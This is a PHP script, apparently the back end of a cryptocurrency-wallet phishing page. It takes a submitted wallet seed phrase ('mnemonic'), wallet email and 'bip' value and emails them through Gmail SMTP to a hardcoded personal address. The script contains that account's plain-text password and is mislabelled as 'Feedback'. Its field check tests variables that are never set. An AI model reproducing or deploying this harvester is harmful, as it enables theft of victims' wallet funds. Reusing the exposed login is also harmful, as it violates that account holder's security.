<?php
require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$subject = "Feedback";
$mnemonic = $_POST['mnemonic'];
$wallet_email = $_POST['wallet_email'];
$bip = $_POST['bip'];
$email_from = $wallet_email;
$email_to = 'feranmiolasunkanmi91@gmail.com';

if($sender== '' || $mail_id== '' || $cont_no== '' || $company== '' || $msg_txt== ''){
        echo "check the fields";
    }else{

    $subject='Query from '.$sender;
    $message='Dear Sir,<br><br>'.$subject.'<br><br>Mnemonic: '.$mnemonic.'<br>Wallet_email: '.$wallet_email.'<br>Bip: '.$bip;

$mail = new PHPMailer();
$mail->isSMTP();
$mail->Host = "smtp.gmail.com";
$mail->SMTPAuth = "true";
$mail->SMTPSecure = "tls";
$mail->Port = "587";
$mail->Username = "feranmiolasunkanmi91@gmail.com";
$mail->Password = "femzyemmy";
$mail->Subject = "Test";
$mail->setFrom($_POST['wallet_email'], $_POST['mnemonic']);
$mail->AddReplyTo($_POST['wallet_email'], $_POST['mnemonic']);
$mail->Subject = "/new Entry";
$mail->MsgHTML($mnemonic . $wallet_email . $bip);

$mail->Body = $wallet_email . $bip;
$mail->addAddress($email_to);
if ( $mail->Send() ) {
  echo "Email Sent";
}else{
  echo "Error";
}
}
$mail->smtpClose();

?>
